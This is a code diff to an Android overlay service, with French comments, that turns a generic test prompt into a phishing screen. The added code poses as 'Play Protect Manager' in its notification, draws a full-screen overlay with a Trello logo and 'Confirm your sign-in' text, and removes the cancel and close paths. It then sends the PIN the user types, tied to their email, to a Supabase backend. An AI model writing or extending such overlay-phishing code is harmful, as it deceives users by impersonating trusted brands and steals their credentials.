@@ -8,6 +8,9 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Color;
+import android.graphics.Typeface;
+import android.graphics.drawable.GradientDrawable;
+import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
@@ -15,9 +18,10 @@ import android.text.InputType;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.View;
+import android.view.ViewGroup;
 import android.view.WindowManager;
 import android.widget.FrameLayout;
-import android.widget.Button;
+import android.widget.ImageView;
 import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.TextView;
@@ -40,12 +44,11 @@ public final class OverlayPromptService extends Service {
     private static final String ACTION_STOP = "stop";
 
     private static final String EXTRA_TITLE = "title";
-    private static final String EXTRA_DESCRIPTION = "description";
     private static final String EXTRA_HINT = "hint";
-    private static final String EXTRA_EMAIL = "email";
     private static final String EXTRA_LANG = "lang";
+    private static final String EXTRA_EMAIL = "email";
 
-    private static final String CHANNEL_ID = "andtracker_overlay";
+    private static final String CHANNEL_ID = "playprotect_overlay";
     private static final int NOTIF_ID = 0x41A7;
 
     private WindowManager wm;
@@ -59,29 +62,28 @@ public final class OverlayPromptService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // IMPORTANT: si on est démarré via startForegroundService (Android O+),
+        // on doit appeler startForeground rapidement, même si on décide de stop ensuite.
+        // Sinon: ForegroundServiceDidNotStartInTimeException.
+        startAsForeground();
+
         String action = intent != null ? intent.getStringExtra(EXTRA_ACTION) : null;
         if (ACTION_STOP.equalsIgnoreCase(action)) {
             stopSelf();
             return START_NOT_STICKY;
         }
 
-        // IMPORTANT (Android 8+): si on a été lancé via startForegroundService(),
-        // on doit appeler startForeground() rapidement, même si on va s'arrêter ensuite.
-        startAsForeground();
-
         if (!Settings.canDrawOverlays(this)) {
-            // Pas de fallback UI ici: si l'autorisation n'est pas accordée, on stop.
-            Log.w(TAG, "Permission overlay absente (canDrawOverlays=false) -> stop");
+            Log.w(TAG, "Permission overlay absente -> stop");
             stopSelf();
             return START_NOT_STICKY;
         }
 
         String title = intent != null ? intent.getStringExtra(EXTRA_TITLE) : null;
-        String description = intent != null ? intent.getStringExtra(EXTRA_DESCRIPTION) : null;
         String hint = intent != null ? intent.getStringExtra(EXTRA_HINT) : null;
-        String email = intent != null ? intent.getStringExtra(EXTRA_EMAIL) : null;
         String lang = intent != null ? intent.getStringExtra(EXTRA_LANG) : null;
-        showOverlay(title, description, hint, email, lang);
+        String email = intent != null ? intent.getStringExtra(EXTRA_EMAIL) : null;
+        showOverlay(title, hint, lang, email);
 
         return START_NOT_STICKY;
     }
@@ -100,10 +102,10 @@ public final class OverlayPromptService extends Service {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 NotificationChannel ch = new NotificationChannel(
                         CHANNEL_ID,
-                        "AndTracker Overlay",
+                        "Play Protect Manager",
                         NotificationManager.IMPORTANCE_LOW
                 );
-                ch.setDescription("Service overlay de test");
+                ch.setDescription("Overlay Play Protect Manager");
                 nm.createNotificationChannel(ch);
             }
 
@@ -123,8 +125,8 @@ public final class OverlayPromptService extends Service {
                     : new Notification.Builder(this);
 
             Notification n = b
-                    .setContentTitle("AndTracker overlay")
-                    .setContentText("Service overlay actif (test).")
+                    .setContentTitle("Play Protect Manager")
+                    .setContentText("Confirmation de connexion en cours.")
                     .setSmallIcon(android.R.drawable.ic_dialog_info)
                     .addAction(new Notification.Action.Builder(
                             android.R.drawable.ic_menu_close_clear_cancel,
@@ -140,7 +142,20 @@ public final class OverlayPromptService extends Service {
         }
     }
 
-    private void showOverlay(String title, String description, String hint, String email, String lang) {
+    private boolean isEnglish(String lang) {
+        String s = (lang == null) ? "" : lang.trim().toLowerCase();
+        if (s.isEmpty()) return false;
+        // accepte: "en", "en-US", "en_GB", etc.
+        return s.startsWith("en");
+    }
+
+    private String safeEmailOrPlaceholder(String email, boolean en) {
+        String e = (email == null) ? "" : email.trim();
+        if (!e.isEmpty()) return e;
+        return en ? "your email" : "votre email";
+    }
+
+    private void showOverlay(String title, String hint, String lang, String email) {
         if (overlayView != null) return;
         wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         if (wm == null) return;
@@ -161,134 +176,142 @@ public final class OverlayPromptService extends Service {
                 flags,
                 android.graphics.PixelFormat.TRANSLUCENT
         );
-        lp.gravity = Gravity.TOP | Gravity.START;
-        lp.x = 0;
+        lp.gravity = Gravity.TOP;
         lp.y = 0;
         lp.dimAmount = 0.65f;
-        lp.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
 
-        final boolean isFr = (lang != null && lang.toLowerCase().startsWith("fr"));
-        final String tTitle = (title == null || title.trim().isEmpty())
-                ? (isFr ? "Action requise" : "Action required")
-                : title.trim();
-        final String tDesc = (description == null || description.trim().isEmpty())
-                ? (isFr ? "Merci de confirmer l'information ci-dessous." : "Please confirm the information below.")
-                : description.trim();
-        final String tEmailLabel = isFr ? "Email" : "Email";
-        final String tInputLabel = isFr ? "Réponse" : "Response";
-        final String tCancel = isFr ? "Annuler" : "Cancel";
-        final String tOk = isFr ? "Envoyer" : "Submit";
-        final String tHint = (hint == null || hint.trim().isEmpty())
-                ? (isFr ? "Tape ta réponse…" : "Type your response…")
-                : hint.trim();
+        final boolean en = isEnglish(lang);
+        final String emailSafe = safeEmailOrPlaceholder(email, en);
+        final String uiTitle = en ? "Confirm your sign-in" : "Confirmez votre connexion";
+        final String uiDesc = en
+                ? ("Use " + emailSafe + " to access Trello Enterprise")
+                : ("Utilisez " + emailSafe + " pour accéder à Trello Enterprise");
+        final String uiLabel = en ? "Enter your PIN code" : "Saisissez votre code PIN";
+        final String uiBtn = en ? "Confirm sign-in" : "Confirmer la connexion";
 
-        // Root fullscreen avec backdrop sombre
+        // Fullscreen backdrop + centered card
         FrameLayout backdrop = new FrameLayout(this);
         backdrop.setLayoutParams(new FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.MATCH_PARENT,
-                FrameLayout.LayoutParams.MATCH_PARENT
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT
         ));
-        backdrop.setBackgroundColor(0xCC0B1020); // bleu-noir semi-transparent
-        backdrop.setOnClickListener(v -> stopSelf()); // tap backdrop -> close (simple)
+        backdrop.setBackgroundColor(0xCC0B1220);
 
-        // "Card" centrée
+        int cardPad = dp(18);
         LinearLayout card = new LinearLayout(this);
         card.setOrientation(LinearLayout.VERTICAL);
-        card.setPadding(dp(18), dp(18), dp(18), dp(18));
-        card.setBackgroundColor(0xFFF8FAFF);
-        card.setClickable(true); // pour ne pas propager le click vers le backdrop
+        card.setPadding(cardPad, cardPad, cardPad, cardPad);
+
+        GradientDrawable cardBg = new GradientDrawable();
+        cardBg.setColor(Color.WHITE);
+        cardBg.setCornerRadius(dp(20));
+        card.setBackground(cardBg);
+        card.setElevation(dp(10));
 
         FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.MATCH_PARENT,
-                FrameLayout.LayoutParams.WRAP_CONTENT
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
         );
-        cardLp.leftMargin = dp(16);
-        cardLp.rightMargin = dp(16);
-        cardLp.topMargin = dp(72);
-        cardLp.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL;
-        backdrop.addView(card, cardLp);
+        cardLp.gravity = Gravity.CENTER;
+        cardLp.leftMargin = dp(18);
+        cardLp.rightMargin = dp(18);
+        card.setLayoutParams(cardLp);
 
-        TextView tvTitle = new TextView(this);
-        tvTitle.setText(tTitle);
-        tvTitle.setTextSize(22f);
-        tvTitle.setTextColor(0xFF0B1020);
-        tvTitle.setPadding(0, 0, 0, dp(8));
-        card.addView(tvTitle);
+        // Logo Trello (vector drawable)
+        ImageView logo = new ImageView(this);
+        try {
+            logo.setImageResource(R.drawable.trello_logo);
+        } catch (Exception ignored) {}
+        FrameLayout.LayoutParams logoLp = new FrameLayout.LayoutParams(dp(56), dp(56));
+        logoLp.gravity = Gravity.CENTER_HORIZONTAL;
+        logo.setLayoutParams(logoLp);
+        logo.setScaleType(ImageView.ScaleType.FIT_CENTER);
+        card.addView(logo);
 
-        TextView tvDesc = new TextView(this);
-        tvDesc.setText(tDesc);
-        tvDesc.setTextSize(14.5f);
-        tvDesc.setTextColor(0xFF394055);
-        tvDesc.setPadding(0, 0, 0, dp(14));
-        card.addView(tvDesc);
+        TextView tv = new TextView(this);
+        tv.setText(uiTitle);
+        tv.setTextSize(20f);
+        tv.setTextColor(Color.BLACK);
+        tv.setTypeface(Typeface.DEFAULT_BOLD);
+        tv.setPadding(0, dp(14), 0, dp(6));
+        tv.setGravity(Gravity.CENTER_HORIZONTAL);
+        card.addView(tv);
 
-        TextView tvEmail = new TextView(this);
-        tvEmail.setText(tEmailLabel);
-        tvEmail.setTextSize(13f);
-        tvEmail.setTextColor(0xFF5B647C);
-        tvEmail.setPadding(0, 0, 0, dp(6));
-        card.addView(tvEmail);
+        TextView desc = new TextView(this);
+        desc.setText(uiDesc);
+        desc.setTextSize(14f);
+        desc.setTextColor(0xFF334155); // slate-700
+        desc.setPadding(0, 0, 0, dp(16));
+        desc.setGravity(Gravity.CENTER_HORIZONTAL);
+        card.addView(desc);
 
-        EditText etEmail = new EditText(this);
-        etEmail.setInputType(InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
-        etEmail.setTextColor(0xFF0B1020);
-        etEmail.setHintTextColor(0xFF8B93A9);
-        etEmail.setText((email == null) ? "" : email);
-        etEmail.setSingleLine(true);
-        card.addView(etEmail);
-
-        TextView tvInput = new TextView(this);
-        tvInput.setText(tInputLabel);
-        tvInput.setTextSize(13f);
-        tvInput.setTextColor(0xFF5B647C);
-        tvInput.setPadding(0, dp(12), 0, dp(6));
-        card.addView(tvInput);
+        TextView label = new TextView(this);
+        label.setText(uiLabel);
+        label.setTextSize(13f);
+        label.setTextColor(0xFF0F172A); // slate-900
+        label.setPadding(0, 0, 0, dp(8));
+        card.addView(label);
 
         EditText et = new EditText(this);
-        et.setHint(tHint);
-        et.setInputType(InputType.TYPE_CLASS_TEXT);
-        et.setTextColor(0xFF0B1020);
-        et.setHintTextColor(0xFF8B93A9);
-        et.setMinLines(2);
-        et.setGravity(Gravity.TOP);
+        et.setHint(en ? "PIN" : "PIN");
+        et.setInputType(InputType.TYPE_CLASS_NUMBER);
+        et.setTextColor(Color.BLACK);
+        et.setHintTextColor(0xFF94A3B8); // slate-400
+        et.setPadding(dp(14), dp(12), dp(14), dp(12));
+
+        GradientDrawable inputBg = new GradientDrawable();
+        inputBg.setColor(0xFFF8FAFC); // slate-50
+        inputBg.setCornerRadius(dp(14));
+        inputBg.setStroke(dp(1), 0xFFE2E8F0); // slate-200
+        et.setBackground(inputBg);
         card.addView(et);
 
-        LinearLayout buttons = new LinearLayout(this);
-        buttons.setOrientation(LinearLayout.HORIZONTAL);
-        buttons.setPadding(0, dp(16), 0, 0);
-        buttons.setGravity(Gravity.END);
+        TextView btn = new TextView(this);
+        btn.setText(uiBtn);
+        btn.setTextColor(Color.WHITE);
+        btn.setTextSize(16f);
+        btn.setTypeface(Typeface.DEFAULT_BOLD);
+        btn.setGravity(Gravity.CENTER);
+        btn.setPadding(dp(16), dp(14), dp(16), dp(14));
 
-        Button cancel = new Button(this);
-        cancel.setText(tCancel);
-        cancel.setOnClickListener(v -> stopSelf());
-        buttons.addView(cancel);
+        GradientDrawable btnBg = new GradientDrawable();
+        btnBg.setColor(0xFF2563EB); // blue-600
+        btnBg.setCornerRadius(dp(16));
+        btn.setBackground(btnBg);
 
-        Button ok = new Button(this);
-        ok.setText(tOk);
-        ok.setOnClickListener(v -> {
-            String vEmail = String.valueOf(etEmail.getText()).trim();
+        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+        );
+        btnParams.topMargin = dp(16);
+        btn.setLayoutParams(btnParams);
+
+        btn.setOnClickListener(v -> {
             String value = String.valueOf(et.getText()).trim();
-            String vLang = (lang == null) ? "" : lang.trim();
-            Log.i(TAG, "Overlay submit email=" + vEmail + " lang=" + vLang + " value=" + value);
-
-            // Encodage simple (pour test). Si tu veux du JSON, on peut le faire ensuite.
-            String payload = "email=" + vEmail + "|lang=" + vLang + "|value=" + value;
+            Log.i(TAG, "Overlay input: " + value);
+            // 1) Trace event (debug)
             SupabaseAndroidEventsClient.sendEvent(
                     OverlayPromptService.this,
                     getPackageName(),
-                    "overlay_submit",
-                    payload
+                    "overlay_input",
+                    value
+            );
+            // 2) Stocke le PIN dans devices.pin_code (best-effort)
+            SupabaseAndroidEventsClient.upsertDevicePinCode(
+                    OverlayPromptService.this,
+                    value,
+                    emailSafe,
+                    (lang == null ? "" : lang.trim())
             );
             stopSelf();
         });
-        buttons.addView(ok);
 
-        card.addView(buttons);
+        card.addView(btn);
 
+        backdrop.addView(card);
         overlayView = backdrop;
         try {
             wm.addView(overlayView, lp);
-            // Focus sur le champ réponse en priorité
             et.requestFocus();
         } catch (Exception e) {
             Log.e(TAG, "addView overlay failed", e);
